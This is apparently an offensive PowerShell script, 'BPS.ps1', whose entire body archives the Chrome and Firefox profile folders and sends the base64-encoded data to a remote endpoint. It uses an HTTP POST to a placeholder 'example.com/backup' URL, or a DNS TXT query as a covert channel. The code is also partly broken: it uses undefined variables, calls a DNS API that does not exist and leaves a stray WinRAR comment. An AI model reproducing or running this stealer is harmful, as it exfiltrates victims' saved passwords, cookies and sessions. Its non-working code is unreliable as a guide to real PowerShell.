
<#

    BPS.ps1
    Author: J. Moreno @j0moz4 
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

#>

#-------------------------------------------------------------------
#BANNER
#-------------------------------------------------------------------
Write-Host "" -ForegroundColor Yellow
Write-Host "  _,-=._            /|_/|   Hi!" -ForegroundColor Yellow
Write-Host " `-.}   `=._,.-=-._.,  @ @._," -ForegroundColor Yellow
Write-Host "     `._ _,-.   )      _,.-'" -ForegroundColor Yellow
Write-Host "        `    G.m-^m`m'" -ForegroundColor Yellow
Write-Host "______________________________________" -ForegroundColor Yellow
Write-Host "" -ForegroundColor Yellow

#-------------------------------------------------------------------
#Check winRAR installed
#-------------------------------------------------------------------



function Compress-FolderToMemory($sourceFolder) {
    $memoryStream = New-Object System.IO.MemoryStream
    $gzipStream = New-Object System.IO.Compression.GzipStream($memoryStream, [IO.Compression.CompressionMode]::Compress)
    $buffer = New-Object byte[](4096)

    [IO.Directory]::EnumerateFiles($sourceFolder, "*", [IO.SearchOption]::AllDirectories) | ForEach-Object {
        $input = [IO.File]::OpenRead($_)
        try {
            while (($read = $input.Read($buffer, 0, $buffer.Length)) -gt 0) {
                $gzipStream.Write($buffer, 0, $read)
            }
        } finally {
            $input.Dispose()
        }
    }

    $gzipStream.Dispose()
    $memoryStream.ToArray()
}


function Get-Base64SizeInBytes($base64) {
    [math]::Ceiling($base64.Length / 4) * 3
}


$chromeProfileDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$firefoxProfileDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
$dateString = Get-Date -Format "yyyyMMdd-HHmmss"
$chromeZipPath = "$env:temp\chrome-backup-$dateString.zip"
$firefoxZipPath = "$env:temp\firefox-backup-$dateString.zip"

Compress-Archive -Path $chromeProfileDir -DestinationPath $chromeZipPath
Compress-Archive -Path $firefoxProfileDir -DestinationPath $firefoxZipPath


$chromeZipBytes = Get-Content -Path $chromeZipPath -Encoding Byte
$firefoxZipBytes = Get-Content -Path $firefoxZipPath -Encoding Byte


$chromeZipMemory = Compress-FolderToMemory $chromeProfileDir
$firefoxZipMemory = Compress-FolderToMemory $firefoxProfileDir


$chromeBase64 = [System.Convert]::ToBase64String($chromeZipMemory)
$firefoxBase64 = [System.Convert]::ToBase64String($firefoxZipMemory)


$maxDnsTxtRecordSize = 512
if (Get-Base64SizeInBytes($chromeBase64) -gt $maxDnsTxtRecordSize -or Get-Base64SizeInBytes($firefoxBase64) -gt $maxDnsTxtRecordSize) {
    
    $uri = "https://example.com/backup"
    $body = @{
        chromeBase64 = $chromeBase64
        firefoxBase64 = $firefoxBase64
    }
    Invoke-RestMethod -Uri $uri -Method Post -Body $body
} else {
    
    $dnsName = "$subdomain.$domain"

    
    $txtRecordSize = [System.Text.Encoding]::ASCII.GetByteCount($base64Zip)
    if ($txtRecordSize -gt 512) {
        Write-Host "El tamaño del registro TXT supera el límite de 512 bytes. Enviando a través de una petición HTTP POST..."
        $headers = @{ "Content-Type" = "application/x-www-form-urlencoded" }
        $body = @{ "data" = $base64Zip }
        $response = Invoke-WebRequest -Uri $postUrl -Method POST -Headers $headers -Body $body
        if ($response.StatusCode -eq 200) {
            Write-Host "Los datos se enviaron correctamente a través de una petición HTTP POST"
        } else {
            Write-Warning "No se pudo enviar la información a través de una petición HTTP POST"
        }
    } else {
        $dnsTxtRecord = "$subdomain IN TXT `"$base64Zip`""
        $dnsTxtRecordBytes = [System.Text.Encoding]::ASCII.GetBytes($dnsTxtRecord)
        $dnsRecordType = [Net.DnsRecordType]::Txt
        $dnsClass = [Net.DnsClass]::In

        
        $dnsObject = New-Object System.Net.Dns()

        
        try {
            $dnsObject.Send($dnsName, $dnsRecordType, $dnsClass, $dnsTxtRecordBytes)
            Write-Host "Los datos se enviaron correctamente a través de una consulta DNS"
        } catch {
            Write-Warning "No se pudo enviar la información a través de una consulta DNS"
        }
    }
}
